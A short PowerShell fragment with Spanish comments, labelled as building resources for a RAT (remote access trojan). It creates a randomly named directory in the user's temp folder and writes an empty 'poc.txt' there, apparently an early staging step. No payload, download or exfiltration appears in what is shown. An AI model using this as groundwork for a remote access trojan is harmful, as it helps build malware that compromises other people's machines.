# Construir	recursos para el RAT

#String random nombre de directorios.
function random_text {
	return -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
}

#Variables 
$wd = random_text
$path = "$env:temp/$wd"
echo $path

#Crear directorio
mkdir $path
cd $path
echo "" > poc.txt


